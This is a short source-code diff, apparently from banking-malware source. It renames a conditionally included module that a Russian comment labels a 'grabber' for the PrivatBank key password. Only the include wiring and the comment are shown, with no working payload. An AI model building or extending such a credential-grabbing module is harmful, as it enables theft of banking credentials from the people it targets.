@@ -11,7 +11,7 @@
 
 
 // Грабер пароля ключа приватбанка
-#ifdef PrivatBankKeyPassH
-	#include "PrivatBankKeyPass.cpp"
+#ifdef PrivatBankH
+	#include "PrivatBank.cpp"
 #endif
 
